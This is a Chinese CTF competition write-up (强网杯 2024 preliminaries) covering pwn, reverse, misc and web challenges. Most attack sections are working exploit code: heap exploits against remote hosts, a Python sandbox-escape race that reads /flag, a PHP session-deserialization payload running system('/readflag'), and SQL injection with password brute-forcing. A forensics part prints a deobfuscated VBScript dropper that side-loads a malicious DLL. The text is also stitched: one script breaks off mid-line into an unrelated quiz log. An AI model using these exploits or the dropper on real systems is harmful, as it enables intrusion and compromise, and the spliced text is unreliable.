# 强网杯 2024 初赛 Writeup

> 原文: https://www.ctfiot.com/213409.html
> ID: 213409

鸠鸠屎，攞第三，明星战队冇我份。

吊吊嗨，唔识做，点解唔再加个钟。

贴个小广告。

诚邀南方地区高校各个方向的师傅加入 S1uM4i 共同学习，无限进步。

同时承接各类网络安全业务，关于 S1uM4i，您可以在这里了解：https://blog.s1um4i.com/ 。

欢迎联系 staff@s1um4i.com。

2. Pwn

unsetunset2.1 chat_with_meunsetunset

from pwn import *

#sh = process("./pwn2")
sh = remote("101.200.139.65", 20527)
#sh = remote("127.0.0.1", 6666)
def tob(x):
    return str(x).encode()

def add():
    sh.sendlineafter(b'> ', b'1')

def show(idx):
    sh.sendlineafter(b'> ', b'2')
    sh.sendlineafter(b'Index > ', tob(idx))

def edit(idx, data):
    sh.sendlineafter(b'> ', b'3')
    sh.sendlineafter(b'Index > ', tob(idx))
    sh.sendafter(b'Content > ', data)

def remove(idx):
    sh.sendlineafter(b'> ', b'4')
    sh.sendlineafter(b'Index > ', tob(idx))

add()
show(0)
sh.recvuntil(b'Content: ')
arr = eval(sh.recvline().decode())

addrlist = []
addr = 0
for i in range(len(arr)):
    addr += (arr[i] << ((i % 8) * 8))
    if i % 8 == 7:
        addrlist.append(addr)
        addr = 0
for i in range(len(addrlist)):
    print(f"addrlist[{i}] = {hex(addrlist[i])}")

context.terminal = ['tmux', 'splitw', '-h']
#pause()
#gdb.attach(sh)
#context.log_level = 'debug'
edit(0, b'A'*0x20+p64(addrlist[1]-0x2000)+b'A'*0x8+p64(0)+p64(0x2001))
for i in range(0x80):
    log.info(f"i = {i}")
    add()
add()
edit(3, b'A'*0x20+p64(addrlist[1])+b'A'*0x8+p64(0)+p64(0x811)+p64(addrlist[4]+0x18))
sh.recvuntil(b']')
show(0)
sh.recvuntil(b'Content: ')
arr = eval(sh.recvline().decode())

addrlist2 = []
addr = 0
for i in range(len(arr)):
    addr += (arr[i] << ((i % 8) * 8))
    if i % 8 == 7:
        addrlist2.append(addr)
        addr = 0
for i in range(len(addrlist)):
    print(f"addrlist2[{i}] = {hex(addrlist2[i])}")

edit(3, b'A'*0x20+p64(addrlist[1])+b'A'*0x8+p64(0)+p64(0x811)+p64(addrlist2[0]+0x2d40))
show(0)
sh.recvuntil(b'Content: ')
arr = eval(sh.recvline().decode())
addrlist3 = []
addr = 0
for i in range(len(arr)):
    addr += (arr[i] << ((i % 8) * 8))
    if i % 8 == 7:
        addrlist3.append(addr)
        addr = 0
for i in range(len(addrlist)):
    print(f"addrlist3[{i}] = {hex(addrlist3[i])}")

libcbase = addrlist3[0] - 0x472b0
log.success(f"libcbase = {hex(libcbase)}")
edit(3, b'A'*0x20+p64(addrlist[1])+b'A'*0x8+p64(0)+p64(0x811)+p64(addrlist[4]-0x50))
edit(0, p64(libcbase+0x000000000010f75b+1)+p64(libcbase+0x000000000010f75b)+p64(libcbase+0x1cb42f)+p64(libcbase+0x58740))

sh.interactive()

unsetunset2.2 expect_numberunsetunset

exp = ('11010112001111111100101012211102220100110001001011011000110000010010000110111011100100111100001011111111100100'
       '000010000100100101011000101110010011100100011011011000010010011011101001001110110010101100001101100100000001111'
       '1000101110110011001101110011100011000011000110010000111')
payload = ''
for i in exp:
    payload += f"1n{i}n"

from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

p = process("./expect_number")
p.send(payload.encode())
p.sendline(b"2")
_ = p.recvuntil(exp)
text = u64(p.recv(6) + b"x00x00") - 0x4C60
log.success(f"text base: {hex(text)}")
#_Unwind_RaiseException
p.sendline(b"4")
payload = b'a'*0x20+p64(0x555555559518-0x0000555555554000+text)+p64(0x000055555555651A-0x0000555555554000+text)
#gdb.attach(p)
p.sendafter(b"favorite number.", payload)
p.interactive()
# gdb.attach(p)

3. Reverse

unsetunset3.1 mipsunsetunset

先逆mips_bin，字符串交叉引用找到主函数ftext，发现它在0x23000处mmap了一段内存，然后解密一段代码然后执行。shellcode就是简单异或验证输入，但是弄出来的flag是错的，问题肯定出在emu。

常规来说需要diff，不过mmap直接在固定位置分配内存，很诡异，所以直接在emu里搜常量0x23000，直接锁定函数0x33D8E0，虽然没有符号但硬猜和gdb调就完事了。

# enc = b'sxrujtv`labiVzbp`vpg|'
# enc = bytearray(enc)
# i = 0
# j = 21

# for _ in range(21):
#     enc[i] ^= j
#     i += 1
#     j -= 1

# print(enc)

from Crypto.Cipher import ARC4

for k in range(0xff):
    enc = [0xC4, 0xEE, 0x3C, 0xBB, 0xE7, 0xFD, 0x67, 0x1D, 0xF8, 0x97, 0x68, 0x9D, 0xB, 0x7F, 0xC7, 0x80, 0xDF, 0xF9, 0x4B, 0xA0, 0x46, 0x91]
    enc[7], enc[11] = enc[11], enc[7]
    enc[12], enc[16] = enc[16], enc[12]
    for i in range(22):
        enc[i] ^= k

    rc4 = ARC4.new(b'6105t3')
    enc = rc4.decrypt(bytes(enc))

    key = [0xDE, 0xAD, 0xBE, 0xEF]
    enc = bytearray(enc)
    for i in range(22):
        enc[i] ^= key[i % 4]

    flag = []
    for i in range(22):
        for t in range(0x7f):
            v3 = (((((t << 7) & 0xff) | (t >> 1)) << 6) ^ 0xC0 | ((((t << 7) | (t >> 1)) & 0xff) >> 2) ^ 0x3B) ^ 0xBE
            v3 &= 0xff
            v4 = ((((((16 * (((32 * v3) | (v3 >> 3)) ^ 0xAD)) | (((((32 * v3) | (v3 >> 3)) ^ 0xAD) & 0xff) >> 4)) ^ 0xDE) & 0xff) >> 5) | (8 * (((16 * (((32 * v3) | (v3 >> 3)) ^ 0xAD)) | (((((32 * v3) | (v3 >> 3)) ^ 0xAD) & 0xff) >> 4)) ^ 0xDE)))
            v4 &= 0xff
            if v4 == enc[i]:
                flag.append(t)
                break

    if len(flag) == 22 and flag[-1] == ord('}'):
        print(bytes(flag))

unsetunset3.2 rememunsetunset

elf头被破坏了，直接找一个正常的对着改就好。

很容易找到主要逻辑，VM操作码种类不多，自生成代码的部分调试一下就行。

初始化：

flag{大括号里面20字符}    （解完后发现}算进20字符中）

端序转换后分成5个32位无符号整数，以下记为input[0至4]

以下计算全部为64位无符号整数

x = input[0]
tmp_stack = []
check_stack = []

记录用到的操作码：

case F2 00:
    x *= x

case F2 03:
    factor = [3, input[1], 6, 82, 6, 2, 13, 17, input[2], 5, 5, 88, input[2], 4, 5, 232, 35, 8, 16]
    x *= factor[现在是第几次调用F2]

case F7:
    f7_arr: [u64] = [input[i] for i in [0, 1, 1, 0, 1, 0, 0, 2, 2, 3, 2, 3, 3, 4, 4]] + [0, 0]
                                       ^ 此数组下标从1开始遍历，等价地，这里已经去掉了第一项
    tmp_stack.push(x)
    x = f7_arr[现在是第几次调用F7]
    
case F0 00 03:
    a2 = tmp_stack.pop()
    a1 = tmp_stack.pop()
    tmp_stack.push(a1 + a2)

case F1 00 03:
    a2 = tmp_stack.pop()
    a1 = tmp_stack.pop()
    tmp_stack.push(a2 - a1)

case F6 03:
    check_stack.push(tmp_stack.pop() % 0x5E2F4391)

case F3 00 03:
    enc = [0x42DB9F06, 0x35368926, 0x509A3978, 0x1EBFA92F, 0x555CC98C]
    x = x ^ check_stack.pop() ^ enc[现在是第几次调用F3]

case F8:
    x == 0

加密过程：

0F2h, 0, 0F2h, 3, 0F7h,
0F2h, 3, 0F2h, 3, 0F7h,
0F2h, 3, 0F7h,
0F2h, 3, 0F7h,
0F2h, 0, 0F2h, 3, 0F7h,
0F2h, 3, 0F7h,
0F2h, 3, 0F7h,
0F2h, 3, 0F2h, 3, 0F7h,
0F2h, 0, 0F2h, 3, 0F7h,
0F2h, 3, 0F7h,
0F2h, 3, 0F2h, 3, 0F7h,
0F2h, 0, 0F2h, 3, 0F7h,
0F2h, 3, 0F7h,
0F2h, 0, 0F2h, 3, 0F7h,
0F2h, 3, 0F7h,
0F2h, 0, 0F2h, 3, 0F7h,

0F0h, 0, 3, 0F1h, 0, 3, 0F6h, 3,
0F0h, 0, 3, 0F1h, 0, 3, 0F6h, 3,
0F0h, 0, 3, 0F1h, 0, 3, 0F6h, 3,
0F0h, 0, 3, 0F0h, 0, 3, 0F6h, 3,
0F0h, 0, 3, 0F0h, 0, 3, 0F1h, 0, 3, 0F6h, 3,

0F7h, 0F3h, 0, 3, 0F3h, 0, 3, 0F3h, 0, 3, 0F3h, 0, 3, 0F3h, 0, 3, 0F8h

对拍：

import queue

a = [0x61616163, 0x61616164, 0x61616165, 0x61616166, 0x61616167]
tmp_stack = queue.LifoQueue()
check_stack = queue.LifoQueue()

# 0F2h, 0, 0F2h, 3, 0F7h,
tmp_stack.put(a[0] * a[0] * 3)
# 0F2h, 3, 0F2h, 3, 0F7h,
tmp_stack.put(a[0] * a[1] * 6)
# 0F2h, 3, 0F7h,
tmp_stack.put(a[1] * 82)
# 0F2h, 3, 0F7h,
tmp_stack.put(a[1] * 6)
# 0F2h, 0, 0F2h, 3, 0F7h,
tmp_stack.put(a[0] * a[0] * 2)
# 0F2h, 3, 0F7h,
tmp_stack.put(a[1] * 13)
# 0F2h, 3, 0F7h,
tmp_stack.put(a[0] * 17)
# 0F2h, 3, 0F2h, 3, 0F7h,
tmp_stack.put(a[0] * a[2] * 5)
# 0F2h, 0, 0F2h, 3, 0F7h,
tmp_stack.put(a[2] * a[2] * 5)
# 0F2h, 3, 0F7h,
tmp_stack.put(a[2] * 88)
# 0F2h, 3, 0F2h, 3, 0F7h,
tmp_stack.put(a[3] * a[2] * 4)
# 0F2h, 0, 0F2h, 3, 0F7h,
tmp_stack.put(a[2] * a[2] * 5)
# 0F2h, 3, 0F7h,
tmp_stack.put(a[3] * 232)
# 0F2h, 0, 0F2h, 3, 0F7h,
tmp_stack.put(a[3] * a[3] * 35)
# 0F2h, 3, 0F7h,
tmp_stack.put(a[4] * 8)
# 0F2h, 0, 0F2h, 3, 0F7h,
tmp_stack.put(a[4] * a[4] * 16)

# 0F0h, 0, 3, 0F1h, 0, 3, 0F6h, 3,
check_stack.put(tmp_stack.get() + tmp_stack.get() - tmp_stack.get())
# 0F0h, 0, 3, 0F1h, 0, 3, 0F6h, 3,
check_stack.put(tmp_stack.get() + tmp_stack.get() - tmp_stack.get())
# 0F0h, 0, 3, 0F1h, 0, 3, 0F6h, 3,
check_stack.put(tmp_stack.get() + tmp_stack.get() - tmp_stack.get())
# 0F0h, 0, 3, 0F0h, 0, 3, 0F6h, 3,
check_stack.put(tmp_stack.get() + tmp_stack.get() + tmp_stack.get())
# 0F0h, 0, 3, 0F0h, 0, 3, 0F1h, 0, 3, 0F6h, 3,
check_stack.put(tmp_stack.get() + tmp_stack.get() + tmp_stack.get() - tmp_stack.get())

# 0F7h, 0F3h, 0, 3, 0F3h, 0, 3, 0F3h, 0, 3, 0F3h, 0, 3, 0F3h, 0, 3, 0F8h
res = 0
for i in range(5):
    res ^= (check_stack.get() % 0x10000000000000000) % 0x5E2F4391
for i in [0x42DB9F06, 0x35368926, 0x509A3978, 0x1EBFA92F, 0x555CC98C]:
    res ^= i

print(hex(res))

简化：

88*a[1] + 6*a[0]*a[1] + -3*a[0]*a[0] mod 0x5E2F4391 == 0x42DB9F06
17*a[0] + 13*a[1] + 2*a[0]*a[0] mod 0x5E2F4391 == 0x35368926
88*a[2] + 5*a[2]*a[2] + -5*a[0]*a[2] mod 0x5E2F4391 == 0x509A3978
232*a[3] + 5*a[2]*a[2] + -4*a[2]*a[3] mod 0x5E2F4391 == 0x1EBFA92F
16*a[4]*a[4] + 8*a[4] + -35*a[3]*a[3] mod 0x5E2F4391 == 0x555CC98C

在 Zmod(p) 下解方程组，注意到前三个方程恰好是仅关于前三个变量的，可以直接用 resultant 解出 a2；并且解出 a2 之后，就可以解出 a0, a1, a3；关于 a4 的方程是二次的，因此可能有两个根，都需要枚举到

from Crypto.Util.number import *

p = 0x5E2F4391
Zp = Zmod(p)
PR = PolynomialRing(Zp, names=[f"a_{i}" for i in range(5)])
a = PR.gens()

def resultant(f, g, x):
    return f.sylvester_matrix(g, x).det()

I0 = [
    88*a[1] + 6*a[0]*a[1] + -3*a[0]*a[0] - 0x42DB9F06,
    17*a[0] + 13*a[1] + 2*a[0]*a[0] - 0x35368926,
    88*a[2] + 5*a[2]*a[2] + -5*a[0]*a[2] - 0x509A3978,
    232*a[3] + 5*a[2]*a[2] + -4*a[2]*a[3] - 0x1EBFA92F,
    16*a[4]*a[4] + 8*a[4] + -35*a[3]*a[3] - 0x555CC98C,
]

I = I0[:3]

cur_I = I
for i in range(2):
    nxt_I = []
    for j in range(1, 3-i):
        r = resultant(cur_I[0], cur_I[j], a[i])
        nxt_I.append(r)
    cur_I = nxt_I

PR.<x> = Zp[]
f = cur_I[0](0, 0, x, 0, 0)
sol2 = f.roots()

sols = [set() for i in range(5)]
for a2, alpha2 in sol2:
    a0 = -Zp(88*a2 + 5*a2*a2 - 0x509A3978) / Zp(-5*a2)
    a1 = -Zp(17*a0 + 2*a0*a0 - 0x35368926) / Zp(13)
    a3 = -Zp(5*a2*a2 - 0x1EBFA92F) / Zp(232 - 4 * a2)
    g = 16*x*x + 8*x + -35*a3*a3 - 0x555CC98C
    sol4 = g.roots()
    for a4, alpha4 in sol4:
        a_ = [a0, a1, a2, a3, a4]
        if all (f(*a_) == 0 for f in I0):
            for i in range(5):
                sols[i].add(ZZ(a_[i]))

for i in range(5):
    for x_ in sols[i]:
        t = x_
        while True:
            msg = long_to_bytes(int(t))
            if all(32 < x < 128 for x in msg):
                print(f'Possible a{i}: {msg}')
            t += p
            if t > 2^32:
                break

得到结果：

Possible a0: b'3cfb'
Possible a1: b'af5f'
Possible a2: b'9a18'
Possible a3: b'382a'
Possible a4: b'a23}'

flag{3cfbaf5f9a18382aa23}

4. Misc

unsetunset4.1 pickle_jailunsetunset

这道题我们能把 pickle 后的数据的任意一个位置 +1（但是不能是 255 -> 0），并且能控制输入的是在第一个的 name，想要的 flag 在最后面。

首先先随便扔点东西看看 pickle 之后是啥，例如

80 04 95 f1 01 00 00 00 00 00 00 43 03 63 63 63 │ . . . . . . . . . . . C . c c c
94 5d 94 28 43 05 4c 75 63 61 73 94 43 06 4a 65 │ . ] . ( C . L u c a s . C . J e
72 65 6d 79 94 43 07 46 65 6c 69 63 69 61 94 43 │ r e m y . C . F e l i c i a . C
04 54 6f 64 64 94 43 07 57 69 6c 6c 69 61 6d 94 │ . T o d d . C . W i l l i a m .
43 05 4a 61 6d 65 73 94 43 07 43 79 6e 74 68 69 │ C . J a m e s . C . C y n t h i
61 94 43 07 56 61 6c 65 72 69 65 94 43 05 44 61 │ a . C . V a l e r i e . C . D a
76 69 64 94 43 0b 43 68 72 69 73 74 6f 70 68 65 │ v i d . C . C h r i s t o p h e
72 94 43 09 45 6c 69 7a 61 62 65 74 68 94 43 05 │ r . C . E l i z a b e t h . C .
41 61 72 6f 6e 94 43 06 56 69 63 74 6f 72 94 43 │ A a r o n . C . V i c t o r . C
04 4a 6f 68 6e 94 43 04 47 61 72 79 94 43 06 48 │ . J o h n . C . G a r y . C . H
61 79 6c 65 79 94 43 04 47 69 6e 61 94 43 07 47 │ a y l e y . C . G i n a . C . G
61 62 72 69 65 6c 94 43 04 4a 6f 73 65 94 43 05 │ a b r i e l . C . J o s e . C .
4a 6f 79 63 65 94 43 05 53 61 72 61 68 94 43 05 │ J o y c e . C . S a r a h . C .
42 72 69 61 6e 94 43 09 43 68 72 69 73 74 69 6e │ B r i a n . C . C h r i s t i n
65 94 43 04 52 79 61 6e 94 43 05 54 79 6c 65 72 │ e . C . R y a n . C . T y l e r
94 43 05 42 72 75 63 65 94 43 06 53 74 61 63 69 │ . C . B r u c e . C . S t a c i
65 94 43 06 59 76 65 74 74 65 94 43 06 44 6f 6e │ e . C . Y v e t t e . C . D o n
61 6c 64 94 43 07 52 69 63 61 72 64 6f 94 43 04 │ a l d . C . R i c a r d o . C .
53 61 72 61 94 43 04 53 65 61 6e 94 43 06 4b 72 │ S a r a . C . S e a n . C . K r
69 73 74 79 94 43 06 4a 6f 73 65 70 68 94 43 07 │ i s t y . C . J o s e p h . C .
43 68 72 69 73 74 79 94 43 06 57 61 6c 74 65 72 │ C h r i s t y . C . W a l t e r
94 43 06 41 6d 61 6e 64 61 94 43 05 50 65 74 65 │ . C . A m a n d a . C . P e t e
72 94 43 04 47 61 69 6c 94 43 06 42 72 65 6e 64 │ r . C . G a i l . C . B r e n d
61 94 43 08 53 61 6d 61 6e 74 68 61 94 43 05 45 │ a . C . S a m a n t h a . C . E
6d 69 6c 79 94 43 06 41 73 68 6c 65 79 94 43 05 │ m i l y . C . A s h l e y . C .
4b 65 76 69 6e 94 43 07 52 69 63 68 61 72 64 94 │ K e v i n . C . R i c h a r d .
43 07 43 68 61 72 6c 65 73 94 43 05 54 61 6d 6d │ C . C h a r l e s . C . T a m m
79 94 43 04 45 72 69 6e 94 43 05 4b 65 6c 6c 79 │ y . C . E r i n . C . K e l l y
94 43 05 53 68 65 72 69 94 68 00 65 8c 2a 66 6c │ . C . S h e r i . h . e . * f l
61 67 7b 63 62 30 61 62 35 35 31 2d 34 61 37 66 │ a g { c b 0 a b 5 5 1 - 4 a 7 f
2d 34 30 33 65 2d 38 62 62 37 2d 38 63 64 36 61 │ - 4 0 3 e - 8 b b 7 - 8 c d 6 a
37 39 37 65 39 63 32 7d 94 87 94 2e │ 7 9 7 e 9 c 2 } . . . .

然后上面的 name 是一个 C，然后 players 最后一个用了 memo，利用不了。然后 flag 后面还跟着 }x94x87x94.。

然后不难发现，当 name 长度超过 256 时 pickle 就会用 B 来记录，此时它的结构就是

80 04 95 e1 02 00 00 00 00 00 00 42 y1 y2 y3 y4 xx xx xx xx xx xx
 B^^ ----len---- =======name======

然后我们把 B 加一，就会变成 C，后面的长度就会由 4 bytes 变成 1 bytes，并且 y1 是可控的，所以我们就可以在后面的 name 里塞入 pickle bytecode。

然后当时做题的时候把 if name in players: 看成 for name in players: 了

然后我们需要的是让 pickle 返回一个 3-tuple，然后需要在中间的 players 里面有 flag。

所以 name 里面就先用 Cx00 扔一个没用的东西进去。然后再用一个长度刚好的 Bx??x??x??x?? 覆盖到 flag，然后再用 } 塞一个空的 dict，然后后面再由 x87 把前面三个东西堆成一个 3-tuple，就成了。

但是当时不知道看错题了

于是远程打的时候，发现一开始没出，然后就开始瞎调，发现把 Cx00 删掉，再把后面那个的长度随便改一点，就能拿到除了最后一位的 flag（flag{97b7ce0d-5e1d-4423-8d9a-58239589718），然后剩下一位就只剩下 16 种情况，在平台上试出来是 2。

from pwn import *
from struct import pack

r = remote('47.94.195.201', 22929)

r.recvuntil(b'players: [')
names = r.recvuntil(b']!n', drop=True)
names = [ name.removeprefix(b'b'').removesuffix(b''') for name in names.split(b', ') ]
name_len = sum([ len(name) + 3 for name in names ])

FLAG_LEN = len('flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}')
NAME_PRE = b'B' + pack(' icq
(1/13) 攻击者的邮箱是什么? (注意:
MD5(攻击者邮箱),以cyberchef的为准) 示例:
9b04d152845ec0a378394003c96da594
请输入你的答案 > a8cd5b4ba47e185d4a69a583fde84da5
正确✅!
(2/13) 攻击者所投放的文件md5是什么? (注意:
以md5sum的结果为准) 示例:
33ec9f546665aec46947dca16646d48e
请输入你的答案 > f436b02020fa59f3f71e0b6dcac6c7d3
正确✅!
(3/13) 攻击者所使用的攻击载荷后缀是什么？ 示例:
lnk
请输入你的答案 > msc
正确✅!
(4/13) 攻击者所投放样本的初始执行语句在该攻击载荷文件的第几行? 示例:20
请输入你的答案 > 97
正确✅!
(5/13) 经过初始执行后,攻击者所加载的第二部分载荷所使用的语言是什么? 示例:
javascript
请输入你的答案 > VBScript
正确✅!
(6/13) 攻击者所进行的第二部分载荷其将黑DLL存在了什么地方? (注意:
需要提供完成的解混淆后的第二部分载荷s*******s函数的参数) 提交需要MD5(参数内容) 以Cyberchef结果为准 示例:
9b04d152845ec0a378394003c96da594
请输入你的答案 > d2fabdcc28074462ac2379101836c938
正确✅!
(7/13) 攻击者使用的这个白EXE加载黑DLL的手法所对应的MITRE ATT&CK ID是什么? (注意:
请注意示例的提示提交大类即可不需要细化到分项) 示例: T1000
请输入你的答案 > T1574
正确✅!
(8/13) 攻击者所使用的黑DLL劫持了原始DLL的哪个函数? 示例: main
请输入你的答案 > curl_easy_init
正确✅!
(9/13) 攻击者所使用的黑DLL解密下一阶段载荷所使用的算法是什么? 示例:
chacha20
请输入你的答案 > RC4
正确✅!
(10/13) 攻击者所使用的下一阶段载荷的回连C2是什么? (注意:
需要提供ip地址:
端口的形式) 示例:
127.0.0.1:
5100
请输入你的答案 > 192.168.57.119:
6000
正确✅!
(11/13) 攻击者所使用最终阶段载荷所使用的加密算法是什么? 示例:
DES
请输入你的答案 > AES
正确✅!
(12/13) 攻击者所使用最终阶段载荷所使用的密钥的MD5是什么? (注意:
MD5(密钥内容),以cyberchef的为准) 示例:
9b04d152845ec0a378394003c96da594
请输入你的答案 > a524c43df3063c33cfd72e2bf1fd32f6
正确✅!
(13/13) 攻击者使用了什么家族的C2? 示例:
PoshC2
请输入你的答案 > OrcaC2
正确✅!
恭喜你完成了所有任务,这是你的flag 🚩 -->  

查看邮件发件人是 alice@flycode.cn （1/13），邮件中的附件（2/13）解压得到 Microsoft 通用管理文档 (.msc) （3/13），为文本文件，其97行（4/13）有 javascript:
eval，后面有大段文件内容的 Base64

将其中 JavaScript unescape 的部分丢进 CyberChef，得到 VBScript （5/13）脚本

简单处理一下以便观察（用eval会被饥渴C猫狂暴鸿儒吗？不会的，因为看过全部匹配了没问题），处理前还做了些文本替换去掉Int(和&H之类的

import re

with open("1.vbs", "r") as f:
    c = f.read()

matches = re.findall("Chr((.*?))", c)
for i in matches:
    x = i.replace('"', '')
    x = x.replace('/', '//')
    try:
        x = eval(x)
        c = c.replace(f"Chr({i})", chr(x))
    
except:
        pass

print(c)

得到的结果的一个片段（丢掉了引号）：

 OMxa=51734e8e7ec47ec753c252a07b2c516b5c4a201c5f3a7f51676f201d516856fd7f517edc5b895168631162188d5b7684901a77e5ff08003100316708003265e581f3003365e54e3e884c7ebf4e0a8d5bff09002e007000640066
 Set AgUvcCuHzzbl=CreateObject(WScript.Shell)
 Set DfAV40y=CreateObject(Scripting.FileSystemObject)
 O8B1OrkTW=AgUvcCuHzzbl.ExpandEnvironmentStrings(%ProgramFiles%)
 P59b6scR2TD9=O8B1OrkTW Cloudflare
 DfAV40y.CreateFolder(P59b6scR2TD9)
 gwqhhV=P59b6scR2TD9 GUP.exe
 JJNe=P59b6scR2TD9 libcurl.dll
 For i=1 to Len(OMxa) Step 4
 FRURX=FRURX ChrW(CLng(H Mid(OMxa,i,4)))
 Next
 Mw7U=DfAV40y.GetSpecialFolder(2) FRURX
 Set aZPHxtz4=RTcxFmy.selectNodes( /MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_TREE'] )
 rqsgO2mBfu=aZPHxtz4(0).text
 UoLAunW=Xk7fbp8v(rqsgO2mBfu)
 Dim jXnaWeLQ12
 Set jXnaWeLQ12=CreateObject(ADODB.Stream)
 jXnaWeLQ12.Type=1
 jXnaWeLQ12.Open
 jXnaWeLQ12.Write UoLAunW
 jXnaWeLQ12.SaveToFile Mw7U,2
 AgUvcCuHzzbl.run Mw7U ,1,false
 Set aZPHxtz4=RTcxFmy.selectNodes( /MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_MENU'] )
 Ze1C=aZPHxtz4(0).text
 Set aZPHxtz4 = RTcxFmy.selectNodes( /MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_PANE'] )
 JozMh9jg=aZPHxtz4(0).text
 AnZUOdqFuMEw=Xk7fbp8v(Ze1C)
 s4fr2y4Q7lvQ=Xk7fbp8v(JozMh9jg)
 Dim cHh5wARUext
 Set cHh5wARUext=CreateObject(ADODB.Stream)
 cHh5wARUext.Type=1
 cHh5wARUext.Open
 cHh5wARUext.Write AnZUOdqFuMEw
 cHh5wARUext.SaveToFile gwqhhV,2
 Dim BKzG1ldRw7
 Set BKzG1ldRw7=CreateObject(ADODB.Stream)
 BKzG1ldRw7.Type=1
 BKzG1ldRw7.Open
 BKzG1ldRw7.Write s4fr2y4Q7lvQ
 BKzG1ldRw7.SaveToFile JJNe,2
 AgUvcCuHzzbl.run gwqhhV t 8.8.8.8,0,false
 End Function

这部分脚本的作用就是：

释放真正的PDF

释放 /MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_MENU'] 文件名为 GUP.exe

释放 /MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_PANE'] （6/13）文件名为 libcurl.dll

运行 GUP.exe 的参数为 t 8.8.8.8

攻击者每次上传XOR+AES-ECB/PCKS5加密的class攻击载荷

🐎执行载荷后，以载荷中定义的方法返回结果，但是这里每个载荷定义的返回加密结果的方法都相同

5. Web

unsetunset5.1 PyBlocklyunsetunset

中文字符通过 unicode.unicode 可以直接转英文字符，即绕过黑名单

open wirte 写文件，写 run.py 文件做条件竞争

开多线程竞争

import requests
import json
import threading

url = "http://eci-2zedptpxwuwj344tkegy.cloudeci1.ichunqiu.com:
5000"

data = {
    "blocks": {
        "blocks": [
            {
                "type": "print",
                "x": 101,
                "y": 102,
                "inputs": {
                    "TEXT": {
                        "block": {
                            "type": "max",
                            "inputs": {
                                "A": {
                                    "block": {
                                        "type": "text",
                                        "fields": {"TEXT": "‘，‘’））n（open（bytes。fromhex（’72756e2e7079‘）。decode（），’wb‘）。write（bytes。fromhex（’696d706f7274206f730a0a7072696e74286f732e706f70656e282764642069663d2f666c616727292e72656164282929‘）））nnprint（print（’1"}
                                    }
                                },
                                "B": {
                                    "block": {
                                        "type": "math_number",
                                        "fields": {"NUM": 10}
                                    }
                                }
                            }
                        }
                    }
                }
            }
        ]
    }
}

def send_request():
    while True:
        r = requests.post(url + "/blockly_json",
                          headers={"Content-Type": "application/json"}, data=json.dumps(data))
        text = r.text
        if "1 10" not in text and "No such file or direct" not in text and len(text) > 10:
            print(text)
            os.exit(-1)
            break

threads = []
num_threads = 100

for _ in range(num_threads):
    thread = threading.Thread(target=send_request)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

suid dd 读 /flag

unsetunset5.2 xiaohuanxiongunsetunset

search 传 keyword 直接就有 sql 注入

注册账号之后，直接拿 sqlmap 做注入

另外注册一个空密码的账号，通过 sql 注入查询加密之后的密码哈希，进行 md5 解密可以直接拿到 salt 是 bf3a27

利用 salt 进而爆破管理员的密码

import hashlib
import itertools

salt = 'bf3a27'
target_hash = 'cd68b9fa89089351c31f248f7a321583'
chars = '0123456789abcdef'
max_length = 6

for length in range(1, max_length + 1):
    for password_tuple in itertools.product(chars, repeat=length):
        password = ''.join(password_tuple)
        hash_attempt = hashlib.md5((password + salt).encode()).hexdigest()
        if hash_attempt == target_hash:
            print(f'Found password: {password}')
            break

爆破 admin 密码（还真能爆破，真蠢啊

后台找一个洞，拼接写🐎

unsetunset5.3 platformunsetunset

www.zip 下载源码

replace 做逃逸 + session 反序列化

import requests
import os

# url = "http://127.0.0.1:
8888"
url = "http://eci-2zeg97hlr4shg75wqoyp.cloudeci1.ichunqiu.com:80"

while True:
    data = {
        "username": "exec"*9+"popen",
        "password": ';session_key|O:15:"notouchitsclass":1:{s:4:"data";s:28:"syssystemtem("/readflag;ls -alh");";}user|s:1:"1aaaa'
    }
    sess = os.urandom(8).hex()
    r = requests.post(url + "/index.php", data=data, headers={
        "Cookie": f"PHPSESSID={sess}"}, allow_redirects=False)
    r = requests.post(url + "/index.php", data=data, headers={
        "Cookie": f"PHPSESSID={sess}"}, allow_redirects=False)

    r = requests.post(url + "/dashboard.php", data=data, headers={
        "Cookie": f"PHPSESSID={sess}"}, allow_redirects=False)

    text = r.text
    if 'total ' in text:
        print(text)
        print(sess)
        break

unsetunset5.4 snakeunsetunset

脚本玩贪吃蛇，一开始的 POST 输入 username 部分是存在注入的，但是没有回显，只能延时注入

Sqlmap 可以 dump，但是发现数据库没东西，还是得通过脚本玩贪吃蛇到分数之后，进第二关的脑洞

python3 sqlmap.py -r 1.txt --dbms=sqlite --level 2 --threads 8 --tables

+-----------------+
| sqlite_sequence |
| users |
+-----------------+

第二关脑洞就 SQL注入+ SSTI

unsetunset5.5 Proxyunsetunset

直接请求

import requests
import json

url = "http://47.93.99.173:
24678/v2/api/proxy"

headers = {
    "Content-Type": "application/json",
}

data = {
    "url": "http://localhost:
8769/v1/api/flag",
    "method": "POST",
    "body": "",
    "headers": {},
    "follow_redirects": False,
}

response = requests.post(url, headers=headers, data=json.dumps(data))

print(response.text)

echo "ZmxhZ3s1ZjZiYjhjMC1iZmZlLTQxYTQtYTRjMC1kNTE1MGFmYTA1NTd9" | base64 -d
flag{5f6bb8c0-bffe-41a4-a4c0-d5150afa0557}⏎

unsetunset5.6 Password Gameunsetunset

反序列化链子构造

第 11 行的 $value(); 这个是完全执行不了的，反序列化流程不能走这里

function filter($password){
    $filter_arr = array("admin","2024qwb");
    $filter = '/'.implode("|",$filter_arr).'/i';
    return preg_replace($filter,"nonono",$password);
}
class guest{
    public $username;
    public $value;
    public function __tostring(){
        if($this->username=="guest"){
            $value();
        }
        return $this->username;
    }
    public function __call($key,$value){
        if($this->username==md5($GLOBALS["flag"])){
            echo $GLOBALS["flag"];
        }
    }
}
class root{
    public $username;
    public $value;
    public function __get($key){
        if(strpos($this->username, "admin") == 0 && $this->value == "2024qwb"){
            $this->value = $GLOBALS["flag"];
            echo md5("hello:".$this->value);
        }
    }
}
class user{
    public $username;
    public $password;
    public $value;
    public function __invoke(){
        $this->username=md5($GLOBALS["flag"]);
        return $this->password->guess();
    }
    public function __destruct(){
        if(strpos($this->username, "admin") == 0 ){
            echo "hello".$this->username;
        }
    }
}
